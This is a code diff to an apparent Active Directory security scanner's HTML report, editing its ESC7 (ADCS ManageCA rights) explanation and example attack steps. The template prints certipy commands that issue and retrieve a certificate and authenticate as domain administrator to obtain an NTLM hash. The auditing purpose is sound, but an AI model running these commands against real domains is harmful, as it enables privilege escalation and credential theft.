@@ -976,7 +976,7 @@ function Invoke-ADScanner {
                                             <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                         </table></td>
                                         <td class="explanation">
-                                            <p>ESC7 is a vulnerability within ADCS where a low-privileged user has the ManageCA or Manage Certificate rights.</p>
+                                            <p>ESC7 is a vulnerability within ADCS where a low-privileged user has the ManageCA or Manage Certificate rights.$($finding.IdentityReference) has $($finding.ActiveDirectoryRights) over $($finding.Name), giving ability to manage certificate requests.</p>
                                             <p>This allows a low-privileged user to approve failed certificates requests, such ass failed ESC1 requests (allowing ESC1).</p>
                                             <p class="links"><b>Further information:</b></p>
                                             <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
@@ -1018,10 +1018,10 @@ function Invoke-ADScanner {
                                             <div class="attack-container">
                                                 <div class="attack-text">
                                                     <p>2. The failed certificate request can be issued with the ca command and the -issue-request <request ID> parameter.</p>
-                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local -issue-request 57 -u test@test.local -p 'Password123!'</p>
+                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local -issue-request 77 -u test@test.local -p 'Password123!'</p>
 
                                                     <p>The issued certificate can then be retrieved with the req command.</p>
-                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -retrieve 57</p>
+                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -retrieve 77</p>
                                                              
                                                     <p>The certificate can then be used with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                     <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
